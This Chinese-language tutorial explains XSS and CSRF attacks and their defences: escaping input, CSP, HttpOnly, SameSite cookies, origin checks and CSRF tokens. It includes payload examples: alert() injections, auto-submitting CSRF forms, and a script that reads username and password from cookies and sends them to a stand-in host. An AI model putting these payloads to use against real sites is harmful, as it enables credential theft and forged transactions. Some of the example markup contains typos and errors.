
## XSS
### 什么是XSS攻击?
XSS全称是Cross Site Scripting(即跨站脚本),为了和css区分,故叫它XSS.XSS攻击是指浏览器中执行恶意脚本(无论是跨域还是同于),从未拿到用户的信息并操作.
### XSS攻击能做什么? 
- 1. 窃取Cookie
- 2. 监听用户行为,比如输入账号密码后直接发送到黑客服务器
- 3. 修改DOM未在登录表单
- 4. 在页面中生成浮窗广告

### SS攻击的实现的三种方式?
- 1.存储型
- 2.反射型
- 3.文档型

#### 存储型
存储型,顾名思义就是将恶意脚本存储了起来,存储型的XSS将脚本存储到了服务到数据库,然后在客户端执行这些脚本,从而达到攻击的效果
```html
// 常见的场景就是留言评论去提交一段脚本代码,如果前后端没有做好转义的工作,那评论内容存到了数据库,在页面渲染过程中直接执行,相当于执行一段未知逻辑的js代码,是非常恐怖的,这就是存储型CSS攻击

<textarea name="" id="textarea" cols="30" rows="10">
    value值为 <script>alert('哈哈哈')</script>
</textarea>

// 这样无论是谁访问这个页面的时候控制台都会弹出alert('哈哈哈')

```

#### 反射型
反射型XSS指的是恶意脚本作为网络请求的一部分。
```javascript
axios({
    method: 'get',
    data:{
        name: '您<script>alert("你好")</script>',
    }
})
// 这样,在服务端就会拿到name参数,然后将内容返回给浏览器端,浏览器将这些内容作为HTML的一部分解析,发现一个脚本,直接执行,这样就被攻击了.

// 之所以叫她反射型,是因为恶意脚本通过作为网络请求的参数,经过服务器,然后再反射到HTML文档中,执行解析.和存储型不一样的是,服务器并不会存储这些恶意脚本

```

#### 文档型
文档型的XSS攻击并不会经过服务端,而是作为中间人的角色,在数据传输的过程接触到网络数据包,然后修改里面的html文档
这样的劫持方式报货EIFI路由劫持和本地恶意软件.


### 防范措施
XSS攻击的原理: 都是让恶意脚本直接能在浏览器中执行.


防范一个信念,两个利用:
- 一个信念
    千万不要相信任何用户的输入
    无论是在前端还是服务端,都要对用户的输入进行转码或者过滤
    ```javascript
      <script>alert('你完蛋了')</script>
      转换为
      // &lt;script&gt;alert(&#39;你完蛋了&#39;)&lt;/script&gt;
      或者直接将script内容删除
    ```
- 两个利用
    - 利用CSP
        CSP: 即浏览器中的内容安全策略,他的核心思想就是服务器决定浏览器加载哪些资源,具体来说可以完成以下功能
            - 1.限制其他域下的资源加载
            - 2.禁止向其它域提交数据
            - 3.提供上报机制,能帮助我们及时发现XSS攻击
    - 利用HttpOnly
        很多XSS攻击脚本都是用来窃取Cookie,而设置Cookie的HttpOnly属性后,Javascript便无法读取Cookoe的值.这样也能很好的防范XSS攻击

### XSS攻击实例
#### 实例一(存储型和反射型攻击)
```html
<input type="text" src="你哈<script>alert('你完蛋了')</script>">
// 这样无论是谁访问这个页面的时候控制台都会弹出alert('哈哈哈')
```

#### 实例二(利用XSS窃取用户账户和密码)
```html
<input type="text" vlaue="我是谁" />
<input type="text" value="nihao<script src='http://www.baidu.com/'></script>">
```
我们看看 http://www.baidu.com/hack.js 里藏了什么
```javascript
var username=CookieHelper.getCookie('username').value;
var password=CookieHelper.getCookie('password').value;
var script =document.createElement('script');
script.src='http://test.com/index.php?username='+username+'&password='+password;
document.body.appendChild(script);
```

### 总结
XSS 攻击是指浏览器中执行恶意脚本, 然后拿到用户的信息进行操作。主要分为存储型、反射型和文档型。防范的措施包括:

- 一个信念: 不要相信用户的输入，对输入内容转码或者过滤，让其不可执行。
- 两个利用: 利用 CSP，利用 Cookie 的 HttpOnly 属性。




## CSRF 
### 什么是CSRF攻击？
CSRF(Cross-site request forgery), 即跨站请求伪造，指的是黑客诱导用户点击链接，打开黑客的网站，然后黑客利用用户目前的登录状态发起跨站请求。



#### 自动发GET请求
网页里有这样一段代码
```html
<img src="https://xxx.com/info?user=hh&count=100" alt="">
```
进入页面后自动发送get请求,值得注意的是,这个请求会自动带上关于xxx.com的cookie信息(这里是假定你已经在xxx.com中登陆过)
假如服务器没有相应的验证机制,他可能人为请求的是一个正常的用户,因为携带了相应的cookie,然后进行相应的各种操作,可以是转账汇款以及其他的恶意操作


#### 自动发送POST请求
黑客可能自己填了一个表单,写了一段自动提交的脚本
```html
<form id="from"  action="https://xxx.com/info" method="post">
    <input type="text" name="user" value="hh"/>
    <input type="text" name="count" value="100"/>
</formid>
<script>document.getElementById('from').submit();</script>
```
同样也会携带相应的用户cookie信息,让服务器误以为是一个正常的用户再操作,让各种恶意的操作变为可能

#### 诱导点击发送GET请求
在黑客的网站上,可能放上一个链接,驱使你来点击:
```html
<a href="https://xxx/info?user=hhh&count=100" taget="_blank">点击进入修仙世界</a>
```
点击后,自动发送get请求,接下来和自动发GET请求部分同理

这就是CSRF攻击原理.和XSS攻击对比,CSRF攻击并不需要将恶意代码注入用户当前页面的html文档中,而是跳转到新的页面,利用服务器的验证漏洞和用户之前的登录状态来模拟用户进行操作


### 防范措施
#### 1.利用Cookir的SameSite属性

CSRF中重要的一环就是自动发送目标站点下的cookie,然后就是这一份Cookie模拟了用户的身份,因为在Cookie上下文章是防范分不二选择

SameSite可以设置为三个值:
- Strict
    在Strict模式下,浏览器完全禁止第三方请求携带Cookie,比如baidu.com网站只能再baidu.com域名当中请求才能携带Cookie,在其他网站请求都不能
- Lax
    在Lax模式下,就宽松一点了,但是只能再get防范提交表单或者a标签发送get请求的情况下可以写到Cookie,其他情况均不能
- None
    在None模式下,也就是默认模式,请求会自动携带上Cookie

#### 2.验证来源站点
这就需要用到请求中的两个字段: Origin和Referer

其中.Origin只包含域名信息,而Referer包含了具体的URL路径

当然,这两者都是可以伪造的,通过Ajax中自定义请求头即可,安全性略差

#### CSRF Token
Django作为 Python 的一门后端框架，如果是用它开发过的同学就知道，在它的模板(template)中, 开发表单时，经常会附上这样一行代码:
```html
{% csrf_token %}
```
这就是CSRF Token的典型应用,那它的原理是怎样的呢?

首先,浏览器向服务器发送请求时,服务器生成一个字符串,将其植入到返回的页面中

然后浏览器如果要发送请求,就必须带上这个字符串,染回服务器来验证是否合法,如果不合法则不予响应,这个字符串也及以上CSRF Token,通常第三方站点无法拿到这个token,因此也就是被服务器给拒绝

### 总结
CSRF(Cross-site request forgery), 即跨站请求伪造，指的是黑客诱导用户点击链接，打开黑客的网站，然后黑客利用用户目前的登录状态发起跨站请求。
CSRF攻击一般会有三种方式:

自动 GET 请求
自动 POST 请求
诱导点击发送 GET 请求。

防范措施: 利用 Cookie 的 SameSite 属性、验证来源站点和CSRF Token。

